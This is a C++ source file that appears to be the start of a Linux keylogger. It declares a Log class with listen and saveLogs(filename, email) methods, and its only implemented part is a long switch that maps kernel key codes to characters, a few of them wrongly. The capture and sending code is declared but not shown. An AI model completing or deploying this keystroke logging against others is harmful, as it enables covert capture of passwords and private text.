#include <iostream>
#include <fstream>
#include <vector>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <time.h>
#include <unistd.h> // linux specific C++ files
#include <linux/input-event-codes.h> // code equivalents



void safeWriteToFile(int fd, char* content);
std::string getChar(unsigned short code);

struct input_event { // 24 bytes in memory is reserved for the event
    struct timeval time;    
    unsigned short type;    
    unsigned short code;    
    unsigned int value;     
};

class Log {
    public:
        static int archieveCount;
        Log();

        static void listen();
        void saveLogs(std::string filename, std::string email);

        // err : Error message to display, flag : 1 to exit program
        static void error(std::string err, int flag);

    private:
        static void readFile();
        static void processEvent(struct input_event ev, int fd);
        static void printEventData(struct input_event ev);
};

std::string getChar(unsigned short code) {
    std::string c;

    switch (code) {
        case 0:
            c = "RESERVED";
            break;
        case 1:
            c = "ESC";
            break;

        case 2:
            c = '1';
            break;
        case 3:
            c = '2';
            break;
        case 4:
            c = '3';
            break;
        case 5:
            c = '4';
            break;
        case 6:
            c = '5';
            break;
        case 7:
            c = '6';
            break;
        case 8:
            c = '7';
            break;
        case 9:
            c = '8';
            break;

        case 10:
            c = '9';
            break;
        case 11:
            c = '0';
            break;
        case 12:
            c = '-';
            break;
        case 13:
            c = '=';
            break;
        case 14:
            c = "BACKSPACE";
            break;
        case 15:
            c = "TAB";
            break;
        case 16:
            c = 'Q';
            break;
        case 17:
            c = 'W';
            break;
        case 18:
            c = 'E';
            break;
        case 19:
            c = 'R';
            break;
        case 20:
            c = 'T';
            break;
        case 21:
            c = 'Y';
            break;
        case 22:
            c = 'U';
            break;
        case 23:
            c = 'I';
            break;
        case 24:
            c = 'O';
            break;
        case 25:
            c = 'P';
            break;
        case 26:
            c = '(';
            break;
        case 27:
            c = ')';
            break;
        case 28:
            c = "ENTER";
            break;
        case 29:
            c = "LEFT_CTRL";
            break;
        case 30:
            c = 'A';
            break;
        case 31:
            c = 'S';
            break;
        case 32:
            c = 'D';
            break;
        case 33:
            c = 'F';
            break;
        case 34:
            c = 'G';
            break;
        case 35:
            c = 'H';
            break;
        case 36:
            c = 'J';
            break;
        case 37:
            c = 'K';
            break;
        case 38:
            c = 'L';
            break;
        case 39:
            c = ';';
            break;
        case 40:
            c = "'";
            break;
        case 41:
            c = "GRAVE";
            break;
        case 42:
            c = "LEFT_SHIFT";
            break;
        case 43:
            c = "\\";
            break;
        case 44:
            c = 'Z';
            break;
        case 45:
            c = 'X';
            break;
        case 46:
            c = 'C';
            break;
        case 47:
            c = 'V';
            break;
        case 48:
            c = 'B';
            break;
        case 49:
            c = 'N';
            break;
        case 50:
            c = 'M';
            break;
        case 51:
            c = ',';
            break;
        case 52:
            c = '.';
            break;
        case 53:
            c = '/';
            break;
        case 54:
            c = "RIGHT_SHIFT";
            break;
        case 55:
            c = "KPASTERISK";
            break;
        case 56:
            c = "LEFT_ALT";
            break;
        case 57:
            c = "SPACE";
            break;
        case 58:
            c = "CAPS";
            break;
        default: 
            c = "BAD CODE";
            break;
    }

    return c;
}